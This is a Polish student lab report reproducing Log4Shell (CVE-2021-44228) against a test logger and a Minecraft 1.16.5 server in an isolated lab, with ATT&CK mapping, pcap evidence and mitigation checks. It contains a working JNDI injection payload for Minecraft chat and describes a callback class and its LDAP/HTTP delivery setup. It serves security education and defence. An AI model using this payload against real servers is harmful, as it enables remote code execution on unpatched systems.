#import "common.typ": *

#set document(
  title: "PCYB Faza 1: Log4Shell / antena izotropowa 40dBi",
  author: nazwa-zespolu,
)
#set page(margin: 2cm, numbering: "1")
#set text(lang: "pl", size: 11pt)
#set heading(numbering: "1.")
#show raw.where(block: true): it => block(
  width: 100%,
  fill: luma(245),
  inset: 8pt,
  radius: 3pt,
  it,
)
#show figure: set block(breakable: true)

#align(center)[
  #text(size: 16pt, weight: "bold")[Raport Faza 1]
  #v(0.3em)
  #text(size: 13pt)[Log4Shell (CVE-2021-44228) na przykładzie Minecrafta]
  #v(0.3em)
  #text(size: 11pt)[#przedmiot · semestr #semestr]
]

#meta-header(faza: "Faza 1")

= Treść zadania

Zadanie Fazy 1 (PCYB 26Z): realizacja techniczna współczesnego ataku w izolowanym
środowisku laboratoryjnym. Trzeba zaprojektować środowisko, przeprowadzić symulację,
zebrać dowody (procesy, pliki, sieć) i opisać wnioski w raporcie.

Temat zespołu: atak RCE Log4Shell w kontekście serwera Minecraft oraz dema Log4j,
z pokazaniem mitygacji.

= Opis merytoryczny i klasyfikacja MITRE ATT&CK

== Log4Shell

Apache Log4j 2 w podatnych wersjach (m.in. 2.14.1) wykonuje lookupy JNDI na treści
komunikatów logów. Jeśli aplikacja loguje dane kontrolowane przez użytkownika,
możliwy jest łańcuch: ciąg `${jndi:ldap://…}` -> LDAP -> referencja do klasy
i codebase HTTP -> załadowanie klasy w JVM ofiary.

W labie na JVM ofiary ustawiane jest `com.sun.jndi.ldap.object.trustURLCodebase=true`,
bo od JDK 8u191 domyślne ograniczenia blokują zdalne codebase. Bez tej flagi
często widać tylko próbę kontaktu z LDAP, bez wykonania kodu.

== Co robi nasz payload

Klasa `Exploit` (katalog `lab/exploit/`) implementuje `ObjectFactory`. Po
załadowaniu przez JNDI uruchamia się blok `static`: zapisuje znacznik
`evidence/pwned.txt` (czas, użytkownik, katalog, wersja Javy) i nawiązuje
połączenie TCP do listenera na porcie 4444 z komunikatem `exploit-callback`.
To wystarczy jako dowód RCE w labie; nie budujemy pełnego reverse shella.

== Mapowanie ATT&CK


#table(
  columns: (1fr, 1.3fr, 1.8fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Tactic*], [*Technique*], [*Obserwacja w labie*],
  [Initial Access], [T1190], [Logowana treść (logger / czat MC)],
  [Execution], [T1059 / Java class load], [`Exploit` -> `evidence/pwned.txt`],
  [C2], [T1071], [LDAP :1389, HTTP :8888, listener :4444],
  [Discovery], [T1082], [Baner hostname/user na listenerze],
)

= Środowisko analizy

== Oprogramowanie

#table(
  columns: (1.2fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Składnik*], [*Wersja / źródło*],
  [JDK], [OpenJDK 11 (`pkgs.jdk11`)],
  [Log4j (podatna)], [2.14.1, Maven Central],
  [Log4j (mitygacja)], [2.17.1, Maven Central],
  [Minecraft server], [1.16.5, archiwum Mojang],
  [marshalsec], [https://github.com/mbechler/marshalsec],
  [Narzędzia], [tcpdump, wireshark/tshark, strace, netcat, python3, maven, Nix flakes],
  [Topologia], [localhost (porty labowe), VM / host labowy],
)

== Parametry sprzętowe

#table(
  columns: (1fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*CPU*], [#sprzet.cpu],
  [*RAM*], [#sprzet.ram],
  [*GPU*], [#sprzet.gpu],
  [*Dysk*], [#sprzet.dysk],
  [*System*], [#sprzet.os],
  [*Kernel*], [#sprzet.kernel],
)

= Przebieg krok po kroku

== Przygotowanie środowiska

Najpierw trzeba mieć powtarzalne środowisko i działający capture: bez JDK / Log4j
oraz bez CAP_NET_RAW tcpdump nie zapisze pcapa, więc weryfikujemy to przed atakiem.

```bash
nix develop
./scripts/fetch-vendor.sh
./scripts/setup-capture.sh
./scripts/lab-topology.sh localhost
./scripts/verify-env.sh
./scripts/build-all.sh
```

#figure(
  image("figures/screen_capture.png", width: 85%),
  caption: [Konfiguracja tcpdump z CAP_NET_RAW (`setup-capture.sh`).],
)

#figure(
  image("figures/verify_env.png", width: 85%),
  caption: [Weryfikacja środowiska labowego: wszystkie komponenty OK.],
)

#figure(
  image("figures/build.png", width: 85%),
  caption: [Kompilacja VulnerableLogger, klasy Exploit oraz wariantu z Log4j 2.17.1.],
)

== Infrastruktura ataku i monitoring

Żeby łańcuch JNDI w ogóle doszedł do RCE, ofiara musi mieć gdzie zapytać o
referencję (LDAP), skąd pobrać klasę (HTTP) i dokąd odesłać dowód (listener).
Capture uruchamiamy przed PoC, żeby pcap obejmował cały przebieg.

```bash
./scripts/start-monitor.sh
./scripts/start-http-payload.sh
./scripts/start-ldap.sh
./scripts/start-listener.sh
```

#figure(
  image("figures/monitor.png", width: 95%),
  caption: [Równolegle: tcpdump (pcap), HTTP :8888 z Exploit.class, LDAP :1389 (marshalsec), listener :4444.],
)

== Uruchomienie PoC (VulnerableLogger)

PoC na osobnym loggerze daje powtarzalny dowód bez klienta Minecraft.
Po uruchomieniu oczekujemy trzech rzeczy naraz: ciągu JNDI w logu, pliku
`evidence/pwned.txt` oraz wpisu na listenerze. Jeśli którejś nie ma, łańcuch
się urwał (np. brak `trustURLCodebase` albo padł HTTP/LDAP).

```bash
./scripts/run-vulnerable.sh
```

#figure(
  image("figures/vulnerable.png", width: 85%),
  caption: [Wykonanie PoC: ciąg JNDI w logu, zapis `evidence/pwned.txt` (RCE).],
)

#figure(
  image("figures/victim.png", width: 85%),
  caption: [Log aplikacji ofiary (`victim-log4j2.log`) z ciągiem `${jndi:ldap://…}`],
)

#figure(
  image("figures/listener.png", width: 85%),
  caption: [Listener :4444: połączenie zwrotne i komunikat `exploit-callback`.],
)

W pcapie szukamy najpierw ruchu na :1389 i :8888, a potem konkretnie
`GET /Exploit.class` z odpowiedzią 200. To potwierdza, że JVM faktycznie
pobrała klasę, a nie tylko „dotknęła” LDAP.

#figure(
  image("figures/pcap.png", width: 90%),
  caption: [Analiza pcap (tshark): ruch TCP na portach 8888 (HTTP) i 1389 (LDAP).],
)

#figure(
  image("figures/pcap_eclass.png", width: 90%),
  caption: [Ten sam pcap: `GET /Exploit.class` oraz odpowiedzi HTTP 200 na porcie 8888.],
)

== Minecraft 1.16.5 (wektor czatu)

Po udanym PoC na loggerze przenosimy ten sam łańcuch na historyczny wektor:
wiadomość na czacie MC trafia do Log4j serwera. Feed etapów na czacie służy
do podglądu w kliencie; ostatecznym dowodem nadal jest znacznik RCE / callback.

```bash
./scripts/start-mc-server.sh
# klient 1.16.5 offline -> 127.0.0.1:25565
# czat: ${jndi:ldap://127.0.0.1:1389/Exploit}
```

Serwer uruchamia też skrypt `mc-feed`, który przez konsolę RCON wypisuje na czacie
kolejne etapy łańcucha (LDAP, HTTP, callback), żeby było je widać w kliencie.

#figure(
  image("figures/mc_server.png", width: 85%),
  caption: [Start serwera Minecraft 1.16.5 oraz skryptu mc-feed.],
)

#figure(
  image("figures/mc_feed.png", width: 95%),
  caption: [Klient MC: ciąg JNDI na czacie oraz komunikaty etapów LDAP -> HTTP -> callback.],
)

#figure(
  image("figures/mc_pwned.png", width: 85%),
  caption: [Znacznik RCE (`evidence/pwned.txt`) po przebiegu labu.],
)

== Mitygacja

Skoro RCE działa, sprawdzamy dwa typowe sposoby blokady: wyłączenie lookupów
flagą JVM oraz wymiana biblioteki na 2.17.1. W obu przypadkach marker
`pwned.txt` nie powinien powstać.

```bash
./scripts/run-mitigated.sh flag      # -Dlog4j2.formatMsgNoLookups=true
./scripts/run-mitigated.sh patched   # Log4j 2.17.1
```

#figure(
  image("figures/mitig1.png", width: 85%),
  caption: [Mitygacja flagą `formatMsgNoLookups`: brak markera RCE.],
)

#figure(
  image("figures/mitig2.png", width: 85%),
  caption: [Mitygacja Log4j 2.17.1: brak markera RCE.],
)

= Opis załączników

Razem z raportem oddawany jest archiwum
`PCYB_Faza1_antena_izotropowa_40dBi_zrodla.zip` z implementacją PoC
(bez zależności z `vendor/`; te dociąga `./scripts/fetch-vendor.sh`).

Zawartość:

#table(
  columns: (1.2fr, 2fr),
  stroke: 0.5pt,
  inset: 6pt,
  [*Ścieżka*], [*Opis*],
  [`flake.nix`, `flake.lock`], [Pin środowiska Nix (JDK 11, narzędzia)],
  [`README.md`], [Instrukcja uruchomienia labu Fazy 1],
  [`scripts/`], [Skrypty startu (LDAP, HTTP, listener, MC, capture, mitygacja)],
  [`lab/vulnerable/`], [VulnerableLogger + `log4j2.xml` (Log4j 2.14.1)],
  [`lab/exploit/`], [Klasa `Exploit` (znacznik + callback)],
  [`lab/minecraft/`], [Konfiguracja serwera Minecraft 1.16.5 (`eula.txt`, `server.properties`)],
  [`evidence/`], [Logi ofiary, znacznik RCE, listener, pcap],
  [`img/`], [Zrzuty ekranu użyte w raporcie],
  [`docs/`], [Źródła Typst raportu oraz krótki opis scenariusza],
)


= Podsumowanie

Założeniem było zbudowanie izolowanego labu Log4Shell z dowodami sieciowymi
i hostowymi oraz pokazanie mitygacji. Zrealizowano pin Nix, PoC RCE
(VulnerableLogger), demonstrację na Minecraft 1.16.5 z feedem etapów na czacie,
monitoring (tcpdump/tshark) oraz porównanie przed i po zabezpieczeniu
(flaga oraz Log4j 2.17.1).

= Wnioski

Lookup JNDI w Log4j 2.14.1 wraz z LDAP Reference i HTTP codebase realizuje RCE
w warunkach laboratoryjnych przy włączonym `trustURLCodebase`. Flaga
`log4j2.formatMsgNoLookups=true` oraz Log4j 2.17.1 blokują ten wektor; w obu
wariantach nie powstaje marker `pwned.txt`. Minecraft daje kontekst historyczny
z 2021 r.; osobny logger ułatwia powtarzalne dowody. Skala CVE-2021-44228
(CVSS 10.0) pokazuje, jak ważne jest pinowanie zależności i obserwacja
wychodzących połączeń LDAP/HTTP z procesów JVM.

Zebrane artefakty (log aplikacji, znacznik RCE, pcap) wystarczają do dalszej
analizy powłamaniowej: da się z nich wyciągnąć wskaźniki kompromitacji w logach
i ułożyć chronologię zdarzeń. Ruch LDAP/HTTP wychodzący z JVM to też sygnał,
który w produkcji powinien łapać monitoring sieciowy (np. IDS); tego Faza 1
już nie obejmuje. Naturalnym kolejnym krokiem byłaby procedura reagowania
na incydent oparta o te dowody.

#podzial-section()
